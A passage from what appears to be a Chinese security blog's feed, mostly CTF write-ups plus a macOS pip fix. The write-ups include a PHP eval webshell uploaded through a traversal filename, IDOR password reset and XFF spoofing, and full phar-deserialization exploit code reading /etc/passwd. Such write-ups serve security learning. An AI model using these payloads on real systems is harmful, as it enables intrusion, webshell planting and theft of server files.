wrong ! &lt;br&gt;&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> ($result) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;id: &quot;</span> . $result-&gt;id . <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;name:&quot;</span> . $result-&gt;user . <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">        $_SESSION[<span class="string">&#x27;admin&#x27;</span>] = <span class="literal">True</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line"></span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>分析过后，能将这个源码分为3个部分：</p><ol><li>包含flag文件。需要调整<code>page</code>参数</li><li>进行文件写入。需要调整<code>$_SESSION[&#39;admin&#39;]</code>、<code>$_POST[&#39;con&#39;]</code>、<code>$_POST[&#39;file&#39;]</code>三个参数。</li><li>将<code>$_SESSION[&#39;admin&#39;]</code> 设置为true。调整<code>id</code>参数</li></ol><h1 id="2-php弱类型"><a href="#2-php弱类型" class="headerlink" title="2 php弱类型"></a>2 php弱类型</h1><p>需要先使得<code>$_SESSION[&#39;admin&#39;]=true</code>，故先针对第三部分进行处理。</p><ul><li>floatval函数：获取变量的浮点值。</li></ul><p><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/image-20201229161435469.png" alt="image-20201229161435469"></p><p>当floatval函数遇到字符串时，会自动截断后面的内容。</p><ul><li>substr函数：返回字符串的一部分</li></ul><p><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/image-20201229161406321.png" alt="image-20201229161406321"></p><p>substr为负数时，按数组从后到前输出。故使得<code>id=1 9</code>即可，1和9之间有一个空格。</p><p><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/image-20201229161844300.png" alt="image-20201229161844300"></p><h1 id="3-php上传后缀绕过"><a href="#3-php上传后缀绕过" class="headerlink" title="3 php上传后缀绕过"></a>3 php上传后缀绕过</h1><p>尝试上传正常的文件。</p><p><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/image-20201229162616156.png" alt="image-20201229162616156"></p><p>然后进入<code> /uploaded/backup</code>目录即可看见1.txt。</p><p>然后需要利用 Linux 的特性进行绕过后缀。将文件名命名为 <code>a.php/b.php/..</code>  会有意想不到的结果。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$filename = <span class="string">&#x27;a.php/b.php/..&#x27;</span>;</span><br><span class="line">$f = fopen($filename, <span class="string">&#x27;w&#x27;</span>);</span><br><span class="line">fwrite($f, $con);</span><br><span class="line">fclose($f);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这种文件名在php中会被解析为 a.php（可以先将<code>a.php</code>和<code>b.php</code>看见文件夹，使用<code>..</code>会回到上一个文件夹），程序最后会创建一个a.php。</p><p>综合上面的结论，<code>con</code>为php的内容，<code>file</code>为php文件名。把文件名命名为 <code>a.php/b.php/..</code>，如下配置：<br><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/image-20201229163357690.png" alt="image-20201229163357690"></p><p>最后访问 <a href="http://220.249.52.134:46528/uploaded/backup/a.php">http://220.249.52.134:46528/uploaded/backup/a.php</a> 即可。<br><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/image-20201229163655879.png" alt="image-20201229163655879"></p><p>最后写入一句话，使用蚁剑进行连接即可。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">con&#x3D;&lt;?php @eval($_POST[pwd]);?&gt;&amp;&amp;file&#x3D;b.php&#x2F;b.php&#x2F;..</span><br></pre></td></tr></table></figure><p>最后通过命令即可找到flag。</p><p><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/image-20201229164218161.png" alt="image-20201229164218161"></p><p>参考：</p><ol><li><a href="https://www.cnblogs.com/zhengna/p/13452813.html">https://www.cnblogs.com/zhengna/p/13452813.html</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> php弱类型 </tag>
            
            <tag> 文件上传 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>攻防世界-bug</title>
      <link href="d6a9774cd6ea/"/>
      <url>d6a9774cd6ea/</url>
      
        <content type="html"><![CDATA[<h1 id="1-越权改密码"><a href="#1-越权改密码" class="headerlink" title="1 越权改密码"></a>1 越权改密码</h1><p>大概熟悉一下整个网站的功能。</p><ol><li>注册</li><li>找回密码</li><li>登陆</li><li>查询个人信息</li></ol><p><strong>测试注册功能</strong>。我使用SQLmap测试是否有SQL注入，发现并没有找到注入。注册点可能会有二次注入，使用SQLmap测不出来就尝试下一个点。</p><p><strong>测试找回密码功能</strong>。首先是将用户信息进行输入，然后输入新密码。查看源码能看见当前正在找回的用户名<code>1</code></p><p><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/image-20201227225311710.png" alt="image-20201227225311710"></p><p>填入新密码后，HTTP请求头会同时发送用户名和密码。如果系统用此时的用户名来修改密码，那就可以进行越权操作。</p><p><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/image-20201227225242767.png" alt="image-20201227225242767"></p><p>尝试修改用户名为admin，新密码为admin，发送后修改成功（此处存在越权）。</p><p><strong>测试登陆功能</strong>。SQLmap没反应。</p><p><strong>测试查询个人信息</strong>。手动进行sql注入闭合，无反应。尝试进行修改UID，并未得到其他用户的信息。</p><p>其他大佬还注意到了Cookie的异常。</p><p><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/image-20201227230553008.png" alt="image-20201227230553008"></p><p>将<code>4b9987ccafacb8d8fc08d22bbca797ba</code>有点类似MD5，在SOMD5进行解密后得<code>1:admin</code>。也可以通过修改Cookie的方式进行越权。</p><h1 id="2-X-Forward-For绕过IP检测"><a href="#2-X-Forward-For绕过IP检测" class="headerlink" title="2 X-Forward-For绕过IP检测"></a>2 X-Forward-For绕过IP检测</h1><p>登陆后只剩manage功能没有进行测试了，点击之后提示IP错误。遇到 IP 限制，通常有2个思路（大佬应该更多）。</p><ol><li>X-Forward-For：使用Chrome的modheader工具</li><li>SSRF：找源码或者其他漏洞进行SSRF，进行本地文件读取或者其他操作。</li></ol><p><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/image-20201227231106321.png" alt="image-20201227231106321"></p><h1 id="3-文件上传绕过"><a href="#3-文件上传绕过" class="headerlink" title="3 文件上传绕过"></a>3 文件上传绕过</h1><p>成功绕过IP检测后，能看见侧着的笑脸和Where Is The Flag?的字样。在源码中隐藏了另一个信息<code>index.php?module=filemanage&amp;do=???</code>.文件类型的action通常都是upload，故访问<code>index.php?module=filemanage&amp;do=upload</code>页面，在新页面中能进行文件上传。</p><ol><li>选择图片进行上传。</li><li>使用BurpSuite抓包修改内容。<ol><li>将文件后缀改为php5或php4</li><li>将文件内容修改为<code>&lt;script language=&#39;php&#39;&gt;&lt;/script&gt;</code></li></ol></li><li>发送即可得到flag</li></ol><p><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/image-20201227232259360.png" alt="image-20201227232259360"></p><p>参考：</p><ol><li><a href="https://www.cnblogs.com/gaonuoqi/p/11692694.html">https://www.cnblogs.com/gaonuoqi/p/11692694.html</a></li><li><a href="https://blog.csdn.net/weixin_42499640/article/details/98793342">https://blog.csdn.net/weixin_42499640/article/details/98793342</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> 攻防世界 </tag>
            
            <tag> 水平越权 </tag>
            
            <tag> XFF伪造 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>解决mac中pip3对应python2</title>
      <link href="f5754670b401/"/>
      <url>f5754670b401/</url>
      
        <content type="html"><![CDATA[<h1 id="解决mac中pip3对应python2（pip指向问题）"><a href="#解决mac中pip3对应python2（pip指向问题）" class="headerlink" title="解决mac中pip3对应python2（pip指向问题）"></a>解决mac中pip3对应python2（pip指向问题）</h1><h2 id="同理可以解决-pip-对应-Python3-的问题。"><a href="#同理可以解决-pip-对应-Python3-的问题。" class="headerlink" title="同理可以解决 pip 对应 Python3 的问题。"></a>同理可以解决 pip 对应 Python3 的问题。</h2><h1 id="一、问题"><a href="#一、问题" class="headerlink" title="一、问题"></a>一、问题</h1><p>在 mac 中查看 pip 和 pip3 的版本，其中 pip3 对应的 Python 版本是 2.7</p><p><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/image-20201221215802703.png" alt="image-20201221215802703"></p><p>正常情况下应该是：pip对应Python2，pip3对应Python3。</p><h1 id="二、解决"><a href="#二、解决" class="headerlink" title="二、解决"></a>二、解决</h1><p>使用which可以查看指令pip的绝对路径。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">~ » <span class="built_in">which</span> pip                </span><br><span class="line">/usr/<span class="built_in">local</span>/bin/pip</span><br></pre></td></tr></table></figure><p>在mac中使用easy_install安装pip会导致pip和pip3都变成pip</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">~ » sudo easy_install pip                 littlechieh6@bogon</span><br><span class="line">Password:</span><br><span class="line">Searching <span class="keyword">for</span> pip</span><br><span class="line">Best match: pip 20.2b1</span><br><span class="line">Processing pip-20.2b1-py2.7.egg</span><br><span class="line">pip 20.2b1 is already the active version <span class="keyword">in</span> easy-install.pth</span><br><span class="line">Installing pip script to /usr/<span class="built_in">local</span>/bin</span><br><span class="line">Installing pip3.8 script to /usr/<span class="built_in">local</span>/bin</span><br><span class="line">Installing pip3 script to /usr/<span class="built_in">local</span>/bin</span><br><span class="line"></span><br><span class="line">Using /Library/Python/2.7/site-packages/pip-20.2b1-py2.7.egg</span><br><span class="line">Processing dependencies <span class="keyword">for</span> pip</span><br><span class="line">Finished processing dependencies <span class="keyword">for</span> pip</span><br><span class="line">-------------------------------------------------------------</span><br><span class="line">~ » pip3 --version                        littlechieh6@bogon</span><br><span class="line">pip 20.2b1 from /Library/Python/2.7/site-packages/pip-20.2b1-py2.7.egg/pip (python 2.7)</span><br><span class="line">-------------------------------------------------------------</span><br><span class="line">~ » pip --version                         littlechieh6@bogon</span><br><span class="line">pip 20.2b1 from /Library/Python/2.7/site-packages/pip-20.2b1-py2.7.egg/pip (python 2.7)</span><br></pre></td></tr></table></figure><p>或者使用bootstrap.pypa.io网站的get-pip.py脚本安装pip3，会导致pip和pip3都变成pip3</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">~/Desktop » curl https://bootstrap.pypa.io/get-pip.py -o get-pip.py</span><br><span class="line"></span><br><span class="line">  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current</span><br><span class="line">                                 Dload  Upload   Total   Spent    Left  Speed</span><br><span class="line">  0     0    0     0    0     0      0      0 --:--:-- --:--:  1 1842k    1 20565    0     0  43294      0  0:00:43 --:--: 50 1842k   50  935k    0     0   626k      0  0:00:02  0:00:100 1842k  100 1842k    0     0   848k      0  0:00:02  0:00:02 --:--:--  848k</span><br><span class="line">-------------------------------------------------------------</span><br><span class="line">~/Desktop » sudo python3 get-pip.py</span><br><span class="line">-------------------------------------------------------------</span><br><span class="line">~/Desktop » pip --version                 littlechieh6@bogon</span><br><span class="line">pip 20.3.3 from /Library/Python/3.8/site-packages/pip (python 3.8)</span><br><span class="line">-------------------------------------------------------------</span><br><span class="line">~/Desktop » pip3 --version                littlechieh6@bogon</span><br><span class="line">pip 20.3.3 from /Library/Python/3.8/site-packages/pip (python 3.8)</span><br></pre></td></tr></table></figure><p>查看Python2和Python3的执行位置</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">~ » <span class="built_in">which</span> python3                         littlechieh6@bogon</span><br><span class="line">/usr/bin/python3</span><br><span class="line">-------------------------------------------------------------</span><br><span class="line">~ » <span class="built_in">which</span> python                          littlechieh6@bogon</span><br><span class="line">/usr/bin/python</span><br><span class="line">-------------------------------------------------------------</span><br><span class="line">~ » ls -al /usr/bin/python3               littlechieh6@bogon</span><br><span class="line">-rwxr-xr-x  1 root  wheel  31488 Sep 22 08:29 /usr/bin/python3</span><br><span class="line">-------------------------------------------------------------</span><br><span class="line">~ » ls -al /usr/bin/python                littlechieh6@bogon</span><br><span class="line">lrwxr-xr-x  1 root  wheel  75 Jul  1 08:44 /usr/bin/python -&gt; ../../System/Library/Frameworks/Python.framework/Versions/2.7/bin/python2.7</span><br></pre></td></tr></table></figure><p>查看pip的执行位置</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">~ » <span class="built_in">which</span> pip                             littlechieh6@bogon</span><br><span class="line">/usr/<span class="built_in">local</span>/bin/pip</span><br><span class="line">-------------------------------------------------------------</span><br><span class="line">~ » <span class="built_in">which</span> pip3                            littlechieh6@bogon</span><br><span class="line">/usr/<span class="built_in">local</span>/bin/pip3</span><br><span class="line">-------------------------------------------------------------</span><br><span class="line">~ » ls -al /usr/<span class="built_in">local</span>/bin/pip             littlechieh6@bogon</span><br><span class="line">-rwxr-xr-x  1 root  admin  263 Dec 21 22:56 /usr/<span class="built_in">local</span>/bin/pip</span><br><span class="line">-------------------------------------------------------------</span><br><span class="line">~ » ls -al /usr/<span class="built_in">local</span>/bin/pip3            littlechieh6@bogon</span><br><span class="line">-rwxr-xr-x  1 root  admin  263 Dec 21 22:56 /usr/<span class="built_in">local</span>/bin/pip3</span><br></pre></td></tr></table></figure><p>原pip和pip3脚本，关键点在于<code>#!</code>代表执行脚本的路径。由于pip和pip3都是由python3执行，所以使用<code>pip -V</code>和<code>pip3 -V</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/Applications/Xcode.app/Contents/Developer/usr/bin/python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> pip._internal.cli.main <span class="keyword">import</span> main</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    sys.argv[<span class="number">0</span>] = re.sub(<span class="string">r&#x27;(-script\.pyw|\.exe)?$&#x27;</span>, <span class="string">&#x27;&#x27;</span>, sys.argv[<span class="number">0</span>])</span><br><span class="line">    sys.exit(main())</span><br></pre></td></tr></table></figure><p>使用<code>vim /usr/local/bin/pip</code>将解释器指向Python2</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/System/Library/Frameworks/Python.framework/Versions/2.7/bin/python2.7</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> pip._internal.cli.main <span class="keyword">import</span> main</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    sys.argv[<span class="number">0</span>] = re.sub(<span class="string">r&#x27;(-script\.pyw|\.exe)?$&#x27;</span>, <span class="string">&#x27;&#x27;</span>, sys.argv[<span class="number">0</span>])</span><br><span class="line">    sys.exit(main())</span><br></pre></td></tr></table></figure><h1 id="三、效果"><a href="#三、效果" class="headerlink" title="三、效果"></a>三、效果</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">~ » pip -V                                littlechieh6@bogon</span><br><span class="line">pip 20.2b1 from /Library/Python/2.7/site-packages/pip-20.2b1-py2.7.egg/pip (python 2.7)</span><br><span class="line">-------------------------------------------------------------</span><br><span class="line">~ » pip3 -V                               littlechieh6@bogon</span><br><span class="line">pip 20.3.3 from /Library/Python/3.8/site-packages/pip (python 3.8)</span><br></pre></td></tr></table></figure><p>参考教程：</p><ol><li><a href="https://blog.csdn.net/u014259820/article/details/100580970">https://blog.csdn.net/u014259820/article/details/100580970</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> 计算机基础 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PDFCreator题解</title>
      <link href="3ac02a0dcee2/"/>
      <url>3ac02a0dcee2/</url>
      
        <content type="html"><![CDATA[<p>该题为 phar 反序列化，上传文件要求为图片。感觉 phpggc 工具挺香的，决定分享一下。</p><p>比赛地址：<a href="https://ctftime.org/event/854/tasks/">Chaos Communication Camp 2019 </a><br>题解1:<a href="https://teamrocketist.github.io/2019/08/25/Web-Chaos-Communication-Camp-2019-CTF-pdfcreator/">[Web] Chaos Communication Camp 2019 CTF - pdfcreator</a><br>题解2:<a href="https://medium.com/@craig.knott92/ccc-2019-ctf-pdfcreator-9c76fd60452d">CCC 2019 CTF — PDFCreator</a></p><hr><a id="more"></a><p>（ps：为啥突然做这题？某个大佬丢给我的，顺手就蹭了个环境，毕竟搭建环境挺麻烦的，补题都来不及</p><p>首先体验一下网站，上传需要图片小于 500KB，从网上找了一张图片 5k。上传后返回结果。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 顶部显示：Upload successful: upload/fd456406745d816a45cae554c788e754.jpg</span></span><br><span class="line"></span><br><span class="line">&lt;h1&gt;Converted by CoolPDF&lt;/h1&gt;&lt;h3&gt;We hope you enjoyed our service!&lt;/h3&gt;</span><br><span class="line">     &lt;img src=<span class="string">&quot;upload/fd456406745d816a45cae554c788e754.jpg&quot;</span>&gt;</span><br><span class="line">      </span><br></pre></td></tr></table></figure><p>然后再次提交，返回结果为</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># TCPDF ERROR: Unable to create output file: /var/www/html/output/81f851fd84a2591f4608f9a7715095ad.pdf</span></span><br></pre></td></tr></table></figure><p>起初对 phar 不太熟悉，只有大致的了解。开始测试使用题解 1 的 payload，并未修改任何东西，payload 打上去没有任何结果。(实际上应该是有结果的，在 html 源码里，不会直接呈现在页面)<br>界面<br><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/20201031235650.png"><br>源码<br><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/20201031235615.png"></p><p>知道真相，(-.-)# 直接气哭。以后记得多看源码！多看源码！多看源码！</p><hr><h1 id="方法1-手写phar"><a href="#方法1-手写phar" class="headerlink" title="方法1:手写phar"></a>方法1:手写phar</h1><p>首先创建 phar.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;creator.php&quot;</span>;</span><br><span class="line">$jpeg_header_size =</span><br><span class="line"><span class="string">&quot;\xff\xd8\xff\xe0\x00\x10\x4a\x46\x49\x46\x00\x01\x01\x01\x00\x48\x00\x48\x00\x00\xff\xfe\x00\x13&quot;</span>.</span><br><span class="line"><span class="string">&quot;\x43\x72\x65\x61\x74\x65\x64\x20\x77\x69\x74\x68\x20\x47\x49\x4d\x50\xff\xdb\x00\x43\x00\x03\x02&quot;</span>.</span><br><span class="line"><span class="string">&quot;\x02\x03\x02\x02\x03\x03\x03\x03\x04\x03\x03\x04\x05\x08\x05\x05\x04\x04\x05\x0a\x07\x07\x06\x08\x0c\x0a\x0c\x0c\x0b\x0a\x0b\x0b\x0d\x0e\x12\x10\x0d\x0e\x11\x0e\x0b\x0b\x10\x16\x10\x11\x13\x14\x15\x15&quot;</span>.</span><br><span class="line"><span class="string">&quot;\x15\x0c\x0f\x17\x18\x16\x14\x18\x12\x14\x15\x14\xff\xdb\x00\x43\x01\x03\x04\x04\x05\x04\x05\x09\x05\x05\x09\x14\x0d\x0b\x0d\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14&quot;</span>.</span><br><span class="line"><span class="string">&quot;\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\xff\xc2\x00\x11\x08\x00\x0a\x00\x0a\x03\x01\x11\x00\x02\x11\x01\x03\x11\x01&quot;</span>.</span><br><span class="line"><span class="string">&quot;\xff\xc4\x00\x15\x00\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x08\xff\xc4\x00\x14\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xff\xda\x00\x0c\x03&quot;</span>.</span><br><span class="line"><span class="string">&quot;\x01\x00\x02\x10\x03\x10\x00\x00\x01\x95\x00\x07\xff\xc4\x00\x14\x10\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x20\xff\xda\x00\x08\x01\x01\x00\x01\x05\x02\x1f\xff\xc4\x00\x14\x11&quot;</span>.</span><br><span class="line"><span class="string">&quot;\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x20\xff\xda\x00\x08\x01\x03\x01\x01\x3f\x01\x1f\xff\xc4\x00\x14\x11\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x20&quot;</span>.</span><br><span class="line"><span class="string">&quot;\xff\xda\x00\x08\x01\x02\x01\x01\x3f\x01\x1f\xff\xc4\x00\x14\x10\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x20\xff\xda\x00\x08\x01\x01\x00\x06\x3f\x02\x1f\xff\xc4\x00\x14\x10\x01&quot;</span>.</span><br><span class="line"><span class="string">&quot;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x20\xff\xda\x00\x08\x01\x01\x00\x01\x3f\x21\x1f\xff\xda\x00\x0c\x03\x01\x00\x02\x00\x03\x00\x00\x00\x10\x92\x4f\xff\xc4\x00\x14\x11\x01\x00&quot;</span>.</span><br><span class="line"><span class="string">&quot;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x20\xff\xda\x00\x08\x01\x03\x01\x01\x3f\x10\x1f\xff\xc4\x00\x14\x11\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x20\xff\xda&quot;</span>.</span><br><span class="line"><span class="string">&quot;\x00\x08\x01\x02\x01\x01\x3f\x10\x1f\xff\xc4\x00\x14\x10\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x20\xff\xda\x00\x08\x01\x01\x00\x01\x3f\x10\x1f\xff\xd9&quot;</span>;</span><br><span class="line">$phar = <span class="keyword">new</span> Phar(<span class="string">&quot;phar.phar&quot;</span>);</span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar-&gt;addFromString(<span class="string">&quot;test.txt&quot;</span>,<span class="string">&quot;test&quot;</span>);</span><br><span class="line">$phar-&gt;setStub($jpeg_header_size.<span class="string">&quot; __HALT_COMPILER(); ?&gt;&quot;</span>);</span><br><span class="line">$o = <span class="keyword">new</span> \PDFStuff\PDFCreator();</span><br><span class="line">$o-&gt;tmpfile = <span class="string">&quot;/etc/passwd&quot;</span>;</span><br><span class="line">$phar-&gt;setMetadata($o);</span><br><span class="line">$phar-&gt;stopBuffering();</span><br></pre></td></tr></table></figure><p>然后执行命令</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">php phar.php</span><br><span class="line">mv phar.phar phar.jpeg</span><br></pre></td></tr></table></figure><p>将文件上传，并添加 phar 包装器，类似下面的格式</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>Converted by CoolPDF<span class="tag">&lt;/<span class="name">h1</span>&gt;</span><span class="tag">&lt;<span class="name">h3</span>&gt;</span>We hope you enjoyed our service!<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;phar://upload/708697c63f7eb369319c6523380bdf7a_11.jpg&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><p>最后可以得到结果（使用 /etc/passwd 容易回显，以后本地文件包含的时候尽量用这个文件吧）<br><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/03C73EAE-9B6D-4097-86BF-675DAD58D598.png"></p><p>接着开始读/etc/apache2/sites-enabled/000-default.conf（修改上方高亮出），可以从这个文件中判断文件路径。在执行第一行命令的时候可能会报错(一堆输出)，可以不用理会。最终得到web的根路径为 /var/www/html。设置$o-&gt;tmpfile = “ /var/www/html/flag.php”，使用 F12 查看源码即可得到 flag。</p><blockquote><p>$flag = “flag{7f5c676fb4a062752124bcaf69a01701}”;</p></blockquote><hr><h1 id="方法2-使用-PHPGGC-来实现-LFI（Local-File-Include）"><a href="#方法2-使用-PHPGGC-来实现-LFI（Local-File-Include）" class="headerlink" title="方法2: 使用 PHPGGC 来实现 LFI（Local File Include）"></a>方法2: 使用 PHPGGC 来实现 LFI（Local File Include）</h1><p>下载并且初始化 phpggc（复制模版）。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ git clone https:&#x2F;&#x2F;github.com&#x2F;ambionics&#x2F;phpggc</span><br><span class="line">$ cd phpggc</span><br><span class="line">$ mkdir gadgetchains&#x2F;Alles&#x2F; &amp;&amp; mkdir gadgetchains&#x2F;Alles&#x2F;FR &amp;&amp; mkdir gadgetchains&#x2F;Alles&#x2F;FR&#x2F;1 </span><br><span class="line">$ cp templates&#x2F;* gadgetchains&#x2F;Alles&#x2F;FR&#x2F;1&#x2F;*</span><br></pre></td></tr></table></figure><p>修改 gadgetchains/Alles/FR/1/ 下的 chain.php。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">PDFStuff</span> 